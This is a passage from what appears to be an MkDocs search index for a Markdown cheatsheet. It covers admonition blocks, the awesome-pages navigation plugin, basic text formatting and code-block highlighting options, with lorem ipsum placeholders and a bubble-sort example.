starts with !!! , followed by a single keyword used as a [type qualifier]. The content of the block follows on the next line, indented by four spaces: Admonition !!! note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Changing The Title \u00b6 By default, the title will equal the type qualifier in titlecase. However, it can be changed by adding a quoted string containing valid Markdown (including links, formatting, ...) after the type qualifier: Admonition with custom title !!! note \"Phasellus posuere in sem ut cursus\" Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Phasellus posuere in sem ut cursus Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Removing The Title \u00b6 Similar to [changing the title], the icon and title can be omitted entirely by adding an empty string directly after the type qualifier. Note that this will not work for [collapsible blocks]: Admonition without title !!! note \"\" Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Collapsible Blocks \u00b6 When [Details] is enabled and an admonition block is started with ??? instead of !!! , the admonition is rendered as a collapsible block with a small toggle on the right side: Admonition, collapsible ??? note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Adding a + after the ??? token renders the block expanded: Admonition, collapsible and initially expanded ???+ note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Supported Types \u00b6 Following is a list of type qualifiers provided by Material for MkDocs, whereas the default type, and thus fallback for unknown type qualifiers, is note : note Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. abstract , summary , tldr Abstract Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. info , todo Info Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. tip , hint , important Tip Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. success , check , done Success Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. question , help , faq Question Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. warning , caution , attention Warning Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. failure , fail , missing Failure Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. danger , error Danger Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. bug Bug Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. example Example Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. quote , cite Quote Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.", "title": "Admonitions"}, {"location": "utilities/markdown-cheatsheet/admonition/#markdown-admonitions", "text": "Admonitions, also known as call-outs , are an excellent choice for including side content without significantly interrupting the document flow. Material for MkDocs provides several different types of admonitions and allows for the inclusion and nesting of arbitrary content.", "title": "Markdown Admonitions"}, {"location": "utilities/markdown-cheatsheet/admonition/#usage", "text": "Admonitions follow a simple syntax: a block starts with !!! , followed by a single keyword used as a [type qualifier]. The content of the block follows on the next line, indented by four spaces: Admonition !!! note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.", "title": "Usage"}, {"location": "utilities/markdown-cheatsheet/admonition/#changing-the-title", "text": "By default, the title will equal the type qualifier in titlecase. However, it can be changed by adding a quoted string containing valid Markdown (including links, formatting, ...) after the type qualifier: Admonition with custom title !!! note \"Phasellus posuere in sem ut cursus\" Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Phasellus posuere in sem ut cursus Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.", "title": "Changing The Title"}, {"location": "utilities/markdown-cheatsheet/admonition/#removing-the-title", "text": "Similar to [changing the title], the icon and title can be omitted entirely by adding an empty string directly after the type qualifier. Note that this will not work for [collapsible blocks]: Admonition without title !!! note \"\" Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.", "title": "Removing The Title"}, {"location": "utilities/markdown-cheatsheet/admonition/#collapsible-blocks", "text": "When [Details] is enabled and an admonition block is started with ??? instead of !!! , the admonition is rendered as a collapsible block with a small toggle on the right side: Admonition, collapsible ??? note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Adding a + after the ??? token renders the block expanded: Admonition, collapsible and initially expanded ???+ note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.", "title": "Collapsible Blocks"}, {"location": "utilities/markdown-cheatsheet/admonition/#supported-types", "text": "Following is a list of type qualifiers provided by Material for MkDocs, whereas the default type, and thus fallback for unknown type qualifiers, is note : note Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. abstract , summary , tldr Abstract Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. info , todo Info Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. tip , hint , important Tip Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. success , check , done Success Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. question , help , faq Question Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. warning , caution , attention Warning Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. failure , fail , missing Failure Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. danger , error Danger Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. bug Bug Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. example Example Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. quote , cite Quote Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.", "title": "Supported Types"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/", "tags": ["template", "markdown"], "text": "Mkdocs Awesome Pages Plugin \u00b6 An MkDocs plugin that simplifies configuring page titles and their order The awesome-pages plugin allows you to customize how your pages show up the navigation of your MkDocs without having to configure the full structure in your mkdocs.yml. It gives you detailed control using a small configuration file directly placed in the relevant directory of your documentation. MkDocs Awesome Pages Plugin Github Repository Features \u00b6 Customize Navigation \u00b6 Create a file named .pages in a directory and use the nav attribute to customize the navigation on that level. List the files and subdirectories in the order that they should appear in the navigation. nav : - subdirectory - page1.md - page2.md Rest \u00b6 Pages or sections that are not mentioned in the list will not appear in the navigation. However, you may include a ... entry to specify where all remaining items should be inserted. nav : - introduction.md - ... - summary.md Furthermore, it is possible to filter the remaining items using glob patterns or regular expressions. For example to match only the Markdown files starting with introduction- . nav : - ... | introduction-*.md - ... - summary.md Note: The pattern is checked against the basename (folder- / filename) of remaining items - not their whole path. For more details refer to the Rest Filter Patterns section below. Titles \u00b6 You can optionally specify a title for the navigation entry. nav : - ... - First page : page1.md Note: Specifying a title for a directory containing a .pages file that defines a title has no effect. Links \u00b6 You can also use the nav attribute to add additional links to the navigation. nav : - ... - Link Title : https://lukasgeiter.com Sections \u00b6 You can group items by creating new sections. nav : - introduction.md - Section 1 : - page1.md - page2.md - Section 2 : - ... Change Sort Order \u00b6 Create a file named .pages in a directory and set the order attribute to asc or desc to change the order of navigation items. order : desc Note: Unlike the default order, this does not distinguish between files and directories. Therefore pages and sections might get mixed. Collapse Single Nested Pages \u00b6 Note: This feature is disabled by default. More on how to use it below If you have directories that only contain a single page, awesome-pages can \"collapse\" them, so the folder doesn't show up in the navigation. For example if you have the following file structure: docs/ \u251c\u2500 section1/ \u2502 \u251c\u2500 img/ \u2502 \u2502 \u251c\u2500 image1.png \u2502 \u2502 \u2514\u2500 image2.png \u2502 \u2514\u2500 index.md # Section 1 \u2514\u2500 section2/ \u2514\u2500 index.md # Section 2 The pages will appear in your navigation at the root level: Section 1 Section 2 Instead of how MkDocs would display them by default: Section 1 Index Section 2 Index For all pages \u00b6 Collapsing can be enabled globally using the collapse_single_pages option in mkdocs.yml For a sub-section \u00b6 If you only want to collapse certain pages, create a file called .pages in the directory and set collapse_single_pages to true : collapse_single_pages : true You may also enable collapsing globally using the plugin option and then use the .pages file to prevent certain sub-sections from being collapsed by setting collapse_single_pages to false . Note: This feature works recursively. That means it will also collapse multiple levels of single pages. For a single page \u00b6 If you want to enable or disable collapsing of a single page, without applying the setting recursively, create a file called .pages in the directory and set collapse to true or false : collapse : true Hide Directory \u00b6 Create a file named .pages in a directory and set the hide attribute to true to hide the directory, including all sub-pages and sub-sections, from the navigation: hide : true Note: This option only hides the section from the navigation. It will still be included in the build and can be accessed under its URL. Set Directory Title \u00b6 Create a file named .pages in a directory and set the title to override the title of that directory in the navigation: title : Page Title Arrange Pages \u00b6 Deprecated: arrange will be removed in the next major release - Use nav instead . Create a file named .pages in a directory and set the arrange attribute to change the order of how child pages appear in the navigation. This works for actual pages as well as subdirectories. title : Page Title arrange : - page1.md - page2.md - subdirectory If you only specify some pages, they will be positioned at the beginning, followed by the other pages in their original order. You may also include a ... entry at some position to specify where the rest of the pages should be inserted: arrange : - introduction.md - ... - summary.md In this example introduction.md is positioned at the beginning, summary.md at the end, and any other pages in between. Combine Custom Navigation & File Structure \u00b6 MkDocs gives you two ways to define the structure of your navigation. Either create a custom navigation manually in mkdocs.yml or use the file structure to generate the navigation. This feature makes it possible to combine both methods. Allowing you to manually define parts of your navigation without having to list all files. Note: You can freely combine this with all the other features of this plugin. However they will only affect the part of the navigation that is not defined manually. Use the nav entry in mkdocs.yml to define the custom part of your navigation. Include a ... entry where you want the navigation tree of all remaining pages to be inserted. The following examples are based on this file structure: docs/ \u251c\u2500 introduction.md \u251c\u2500 page1.md \u251c\u2500 page2.md \u2514\u2500 folder/ \u251c\u2500 introduction.md \u251c\u2500 page3.md \u2514\u2500 page4.md If you wanted introduction.md , page1.md and page2.md to appear under their own section you could do this: nav : - Start : - page1.md - page2.md - summary.md - ... Which would result in the following navigation: Start Introduction Page 1 Page 2 Folder Introduction Page 3 Page 4 The ... entry can also be placed at a deeper level: nav : - page1.md - Rest : - ... Which would result in the following navigation: Page 1 Rest Introduction Page 2 Folder Introduction Page 3 Page 4 Furthermore, it is possible to filter the remaining items using glob patterns or regular expressions. For example to match only files named introduction.md . nav : - Introductions : - ... | **/introduction.md - ... With the following result: Introductions Introduction Introduction Page 1 Page 2 Folder Page 3 Page 4 Note: The pattern is checked against the path relative to the docs directory. For more details refer to the Rest Filter Patterns section below. By default, remaining items keep their hierarchical structure. You may add flat to flatten all the matching pages: nav : - page1.md - Rest : - ... | flat | **/introduction.md - ... | flat Page 1 Rest Introduction Introduction Page 2 Page 3 Page 4 Rest Filter Patterns \u00b6 In all places where the rest entry ( ... ) is allowed, you can also include a glob pattern or regular expression to filter the items to be displayed. nav : - ... | page-*.md - ... | regex=page-[0-9]+.md The filter only operates on remaining items. This means it will not include items that are explicitly listed in the navigation or items that are matched by another filter that appears earlier in the configuration. You may also include a rest entry without filter to act as a catch-all, inserting everything that is not matched by a filter. Syntax Details \u00b6 Unless the filter starts with regex= it is interpreted as glob pattern, however you may also explicitly say so using glob= . The spaces around ... are optional but recommended for readability. Note: Depending on the characters in your filter, you might also need to use quotes around the whole entry. nav : # equivalent glob entries - ... | page-*.md - ... | glob=page-*.md - ...|page-*.md - '... | page-*.md' # equivalent regex entries - ... | regex=page-[0-9]+.md - ...|regex=page-[0-9]+.md - '... | regex=page-[0-9]+.md' Options \u00b6 You may customize the plugin by passing options in mkdocs.yml : plugins : - awesome-pages : filename : .index collapse_single_pages : true strict : false filename \u00b6 Name of the file used to configure pages of a directory. Default is .pages collapse_single_pages \u00b6 Enable the collapsing of single nested pages. Default is false strict \u00b6 Raise errors instead of warnings when: arrange entries cannot be found nav entries cannot be found Default is true", "title": "Awesome Pages Plugin"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#mkdocs-awesome-pages-plugin", "text": "An MkDocs plugin that simplifies configuring page titles and their order The awesome-pages plugin allows you to customize how your pages show up the navigation of your MkDocs without having to configure the full structure in your mkdocs.yml. It gives you detailed control using a small configuration file directly placed in the relevant directory of your documentation. MkDocs Awesome Pages Plugin Github Repository", "title": "Mkdocs Awesome Pages Plugin"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#features", "text": "", "title": "Features"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#customize-navigation", "text": "Create a file named .pages in a directory and use the nav attribute to customize the navigation on that level. List the files and subdirectories in the order that they should appear in the navigation. nav : - subdirectory - page1.md - page2.md", "title": "Customize Navigation"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#change-sort-order", "text": "Create a file named .pages in a directory and set the order attribute to asc or desc to change the order of navigation items. order : desc Note: Unlike the default order, this does not distinguish between files and directories. Therefore pages and sections might get mixed.", "title": "Change Sort Order"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#collapse-single-nested-pages", "text": "Note: This feature is disabled by default. More on how to use it below If you have directories that only contain a single page, awesome-pages can \"collapse\" them, so the folder doesn't show up in the navigation. For example if you have the following file structure: docs/ \u251c\u2500 section1/ \u2502 \u251c\u2500 img/ \u2502 \u2502 \u251c\u2500 image1.png \u2502 \u2502 \u2514\u2500 image2.png \u2502 \u2514\u2500 index.md # Section 1 \u2514\u2500 section2/ \u2514\u2500 index.md # Section 2 The pages will appear in your navigation at the root level: Section 1 Section 2 Instead of how MkDocs would display them by default: Section 1 Index Section 2 Index", "title": "Collapse Single Nested Pages"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#hide-directory", "text": "Create a file named .pages in a directory and set the hide attribute to true to hide the directory, including all sub-pages and sub-sections, from the navigation: hide : true Note: This option only hides the section from the navigation. It will still be included in the build and can be accessed under its URL.", "title": "Hide Directory"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#set-directory-title", "text": "Create a file named .pages in a directory and set the title to override the title of that directory in the navigation: title : Page Title", "title": "Set Directory Title"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#arrange-pages", "text": "Deprecated: arrange will be removed in the next major release - Use nav instead . Create a file named .pages in a directory and set the arrange attribute to change the order of how child pages appear in the navigation. This works for actual pages as well as subdirectories. title : Page Title arrange : - page1.md - page2.md - subdirectory If you only specify some pages, they will be positioned at the beginning, followed by the other pages in their original order. You may also include a ... entry at some position to specify where the rest of the pages should be inserted: arrange : - introduction.md - ... - summary.md In this example introduction.md is positioned at the beginning, summary.md at the end, and any other pages in between.", "title": "Arrange Pages"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#combine-custom-navigation-file-structure", "text": "MkDocs gives you two ways to define the structure of your navigation. Either create a custom navigation manually in mkdocs.yml or use the file structure to generate the navigation. This feature makes it possible to combine both methods. Allowing you to manually define parts of your navigation without having to list all files. Note: You can freely combine this with all the other features of this plugin. However they will only affect the part of the navigation that is not defined manually. Use the nav entry in mkdocs.yml to define the custom part of your navigation. Include a ... entry where you want the navigation tree of all remaining pages to be inserted. The following examples are based on this file structure: docs/ \u251c\u2500 introduction.md \u251c\u2500 page1.md \u251c\u2500 page2.md \u2514\u2500 folder/ \u251c\u2500 introduction.md \u251c\u2500 page3.md \u2514\u2500 page4.md If you wanted introduction.md , page1.md and page2.md to appear under their own section you could do this: nav : - Start : - page1.md - page2.md - summary.md - ... Which would result in the following navigation: Start Introduction Page 1 Page 2 Folder Introduction Page 3 Page 4 The ... entry can also be placed at a deeper level: nav : - page1.md - Rest : - ... Which would result in the following navigation: Page 1 Rest Introduction Page 2 Folder Introduction Page 3 Page 4 Furthermore, it is possible to filter the remaining items using glob patterns or regular expressions. For example to match only files named introduction.md . nav : - Introductions : - ... | **/introduction.md - ... With the following result: Introductions Introduction Introduction Page 1 Page 2 Folder Page 3 Page 4 Note: The pattern is checked against the path relative to the docs directory. For more details refer to the Rest Filter Patterns section below. By default, remaining items keep their hierarchical structure. You may add flat to flatten all the matching pages: nav : - page1.md - Rest : - ... | flat | **/introduction.md - ... | flat Page 1 Rest Introduction Introduction Page 2 Page 3 Page 4", "title": "Combine Custom Navigation &amp; File Structure"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#rest-filter-patterns", "text": "In all places where the rest entry ( ... ) is allowed, you can also include a glob pattern or regular expression to filter the items to be displayed. nav : - ... | page-*.md - ... | regex=page-[0-9]+.md The filter only operates on remaining items. This means it will not include items that are explicitly listed in the navigation or items that are matched by another filter that appears earlier in the configuration. You may also include a rest entry without filter to act as a catch-all, inserting everything that is not matched by a filter.", "title": "Rest Filter Patterns"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#syntax-details", "text": "Unless the filter starts with regex= it is interpreted as glob pattern, however you may also explicitly say so using glob= . The spaces around ... are optional but recommended for readability. Note: Depending on the characters in your filter, you might also need to use quotes around the whole entry. nav : # equivalent glob entries - ... | page-*.md - ... | glob=page-*.md - ...|page-*.md - '... | page-*.md' # equivalent regex entries - ... | regex=page-[0-9]+.md - ...|regex=page-[0-9]+.md - '... | regex=page-[0-9]+.md'", "title": "Syntax Details"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#options", "text": "You may customize the plugin by passing options in mkdocs.yml : plugins : - awesome-pages : filename : .index collapse_single_pages : true strict : false", "title": "Options"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#filename", "text": "Name of the file used to configure pages of a directory. Default is .pages", "title": "filename"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#collapse_single_pages", "text": "Enable the collapsing of single nested pages. Default is false", "title": "collapse_single_pages"}, {"location": "utilities/markdown-cheatsheet/awesome-pages/#strict", "text": "Raise errors instead of warnings when: arrange entries cannot be found nav entries cannot be found Default is true", "title": "strict"}, {"location": "utilities/markdown-cheatsheet/basic-formatting/", "tags": ["markdown-cheatsheet", "mkdocs", "headings", "text-highlighting", "horizontal-line"], "text": "Markdown Basic Formatting \u00b6 Text Styling \u00b6 Markdown makes it easy to format messages. Type a message as you normally would, then use these the following formatting syntax to render the message a specific way Markdown Syntax Result **bold** bold _italic_ italic ==highlight== highlight ~~strike through~~ strike through ^^underline^^ underline `Inline Code` Inline Code ==_you_ **can** ^^combine^^ `too`== you can combine too Horizontal Line \u00b6 Horizontal Line Example Horizontal line --- Three consecutive dashes Result: Horizontal line Three consecutive dashes Heading \u00b6 To create a heading, add number signs (#) in front of a word or phrase. The number of number signs you use should correspond to the heading level. For example, to create a heading level three (h3), use three number signs (e.g., ### My Header). Headings from h1 through h6 are constructed with a # for each level: Regular Headings \u00b6 Regular Headings (h1-h6) ### Heading 3 #### Heading 4 ##### Heading 5 ###### Heading 6 Result: Heading 3 \u00b6 Heading 4 \u00b6 Heading 5 \u00b6 Heading 6 \u00b6 Headings with secondary text \u00b6 Headings with secondary text (h1-h6) ### Heading 3 <small>with secondary text</small> #### Heading 4 <small>with secondary text</small> ##### Heading 5 <small>with secondary text</small> ###### Heading 5 <small>with secondary text</small> Result: Heading 3 with secondary text \u00b6 Heading 4 with secondary text \u00b6 Heading 5 with secondary text \u00b6 Heading 6 with secondary text \u00b6", "title": "Basic Formatting"}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#markdown-basic-formatting", "text": "", "title": "Markdown Basic Formatting"}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#text-styling", "text": "Markdown makes it easy to format messages. Type a message as you normally would, then use these the following formatting syntax to render the message a specific way Markdown Syntax Result **bold** bold _italic_ italic ==highlight== highlight ~~strike through~~ strike through ^^underline^^ underline `Inline Code` Inline Code ==_you_ **can** ^^combine^^ `too`== you can combine too", "title": "Text Styling"}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#horizontal-line", "text": "Horizontal Line Example Horizontal line --- Three consecutive dashes Result: Horizontal line Three consecutive dashes", "title": "Horizontal Line"}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading", "text": "To create a heading, add number signs (#) in front of a word or phrase. The number of number signs you use should correspond to the heading level. For example, to create a heading level three (h3), use three number signs (e.g., ### My Header). Headings from h1 through h6 are constructed with a # for each level:", "title": "Heading"}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#regular-headings", "text": "Regular Headings (h1-h6) ### Heading 3 #### Heading 4 ##### Heading 5 ###### Heading 6 Result:", "title": "Regular Headings"}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-3", "text": "", "title": "Heading 3"}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#headings-with-secondary-text", "text": "Headings with secondary text (h1-h6) ### Heading 3 <small>with secondary text</small> #### Heading 4 <small>with secondary text</small> ##### Heading 5 <small>with secondary text</small> ###### Heading 5 <small>with secondary text</small> Result:", "title": "Headings with secondary text"}, {"location": "utilities/markdown-cheatsheet/basic-formatting/#heading-3-with-secondary-text", "text": "", "title": "Heading 3 with secondary text"}, {"location": "utilities/markdown-cheatsheet/code-blocks/", "tags": ["markdown-cheatsheet", "mkdocs", "code-blocks"], "text": "Markdown Code Blocks \u00b6 Code blocks and examples are an essential part of technical project documentation. Material for MkDocs provides different ways to set up syntax highlighting for code blocks, either during build time using [Pygments] or during runtime using a JavaScript syntax highlighter. Adding a Title \u00b6 In order to provide additional context, a custom title can be added to a code block by using the title=\"<custom title>\" option directly after the shortcode, e.g. to display the name of a file: Example: Code block with title ```py title=\"bubble_sort.py\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` Result: bubble_sort.py def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] Adding Line Numbers To Code Block \u00b6 Example: Line numbers can be added to a code block by using the linenums=\"<start>\" option directly after the shortcode, whereas <start> represents the starting line number. A code block can start from a line number other than 1 , which allows to split large code blocks for readability: Code block with line numbers ```py linenums=\"1\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` Result: def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] Highlighting Specific Lines \u00b6 Specific lines can be highlighted by passing the line numbers to the hl_lines argument placed right after the language shortcode. Note that line counts start at 1 . Code block with highlighted lines ```py hl_lines=\"2 3\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` Result: def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] Highlighting Inline Code Blocks \u00b6 When InlineHilite is enabled, syntax highlighting can be applied to inline code blocks by prefixing them with a shebang, i.e. #! , directly followed by the corresponding language shortcode Example: Inline code block The `#!python range()` function is used to generate a sequence of numbers. Result: The range () function is used to generate a sequence of numbers.", "title": "Code Blocks"}, {"location": "utilities/markdown-cheatsheet/code-blocks/#markdown-code-blocks", "text": "Code blocks and examples are an essential part of technical project documentation. Material for MkDocs provides different ways to set up syntax highlighting for code blocks, either during build time using [Pygments] or during runtime using a JavaScript syntax highlighter.", "title": "Markdown Code Blocks"}, {"location": "utilities/markdown-cheatsheet/code-blocks/#adding-a-title", "text": "In order to provide additional context, a custom title can be added to a code block by using the title=\"<custom title>\" option directly after the shortcode, e.g. to display the name of a file: Example: Code block with title ```py title=\"bubble_sort.py\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` Result: bubble_sort.py def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ]", "title": "Adding a Title"}, {"location": "utilities/markdown-cheatsheet/code-blocks/#adding-line-numbers-to-code-block", "text": "Example: Line numbers can be added to a code block by using the linenums=\"<start>\" option directly after the shortcode, whereas <start> represents the starting line number. A code block can start from a line number other than 1 , which allows to split large code blocks for readability: Code block with line numbers ```py linenums=\"1\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` Result: def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ]", "title": "Adding Line Numbers To Code Block"}, {"location": "utilities/markdown-cheatsheet/code-blocks/#highlighting-specific-lines", "text": "Specific lines can be highlighted by passing the line numbers to the hl_lines argument placed right after the language shortcode. Note that line counts start at 1 . Code block with highlighted lines ```py hl_lines=\"2 3\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` Result: def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ]", "title": "Highlighting Specific Lines"}, {"location": "utilities/markdown-cheatsheet/code-blocks/#highlighting-inline-code-blocks", "text": "When InlineHilite is enabled, syntax highlighting can be applied to inline code blocks by prefixing them with a shebang, 